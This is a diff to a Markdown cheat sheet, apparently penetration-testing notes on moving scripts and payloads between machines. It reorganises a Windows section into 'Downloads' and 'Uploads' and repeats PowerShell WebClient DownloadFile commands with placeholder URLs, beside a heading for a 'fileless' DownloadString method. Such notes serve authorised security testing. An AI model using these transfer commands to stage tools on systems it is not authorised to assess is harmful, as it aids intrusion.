@@ -8,22 +8,19 @@ In the profane rites of assessment, the movement of relics—scripts, payloads, 
 
 <details>
   <summary><strong>🪟 Windows</strong></summary>
-
----
-
-  <details>
-    <summary><strong>PowerShell DownloadFile Method</strong></summary>
-
-  Sync  
-  ```powershell
-  (New-Object Net.WebClient).DownloadFile('<FILE URL>','<OUTPUT FILE>')
-  ```
-
-  Async  
-  ```powershell
-  (New-Object Net.WebClient).DownloadFileAsync('<FILE URL>','<OUTPUT FILE>')
-  ```
-  </details>
+  <details>  
+    <summary><strong>📥 Downloads</strong></summary>
+      <details>
+        <summary><strong>PowerShell DownloadFile Method</strong></summary>
+          Sync  
+          ```powershell
+          (New-Object Net.WebClient).DownloadFile('<FILE URL>','<OUTPUT FILE>')
+          ```
+            Async  
+            ```powershell
+            (New-Object Net.WebClient).DownloadFileAsync('<FILE URL>','<OUTPUT FILE>')
+            ```
+        </details>
 
   <details>
     <summary><strong>PowerShell DownloadString - Fileless Method</strong></summary>
@@ -126,10 +123,13 @@ In the profane rites of assessment, the movement of relics—scripts, payloads, 
   ```cmd
   more <FILE>
   ```
+---
   
-  
-
   </details>
+  </details>
+    <summary><strong>📤 Uploads</strong></summary>
+      <details>
+      </details>
 </details>
 
 ---
